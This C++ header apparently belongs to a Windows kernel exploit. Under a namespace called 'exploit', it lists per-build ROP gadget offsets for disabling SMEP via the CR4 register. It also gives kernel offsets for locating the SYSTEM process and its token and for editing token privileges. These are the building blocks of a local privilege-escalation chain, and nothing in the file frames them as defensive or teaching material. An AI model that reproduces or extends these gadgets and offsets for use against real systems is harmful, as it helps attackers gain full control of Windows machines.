#pragma once

namespace exploit
{
    namespace gadget
    {
        namespace X_19045_2006
        {
            constexpr size_t pop_rcx_ret = 0x20C64C;
            constexpr size_t mov_cr4_rcx_ret = 0x39EB47;
            constexpr size_t mov_cr4_rax_ret = 0xA18523;
            constexpr size_t bypassSMEPVal = 0x250ef8;
        } // namespace X_19045

        namespace X_22621_1105
        {
            constexpr size_t systemEprocessAddrOffset = 0xD1DA20;   // *(nt+systemEprocessAddrOffset) = EPROCESS_ADDR
            constexpr size_t tokenToEporcessOffset = 0x4b8;         // EPROCESS_ADDR + tokenToEporcessOffset = TokenVal
        } // namespace X_22621_1105

        namespace X_26200_4946
        {
            constexpr size_t CmpLayerVersions = 0xEF6B60;
            constexpr size_t CmpLayerVersionCount = 0xEF6BE0;
            constexpr size_t PsInitialSystemProcess = 0xFC5AA8;
            namespace EPROCESS
            {

                constexpr size_t UniqueProcessId = 0x1D0;
                constexpr size_t ActiveProcessLinks = 0x1D8;
                constexpr size_t ImageFileName = 0x338;
                constexpr size_t Token = 0x248;
            } // namespace EPROCESS
            constexpr size_t _SEP_TOKEN_PRIVILEGES = 0x40;

        } // namespace X_26200_4946


    } // namespace gadget

} // namespace exploit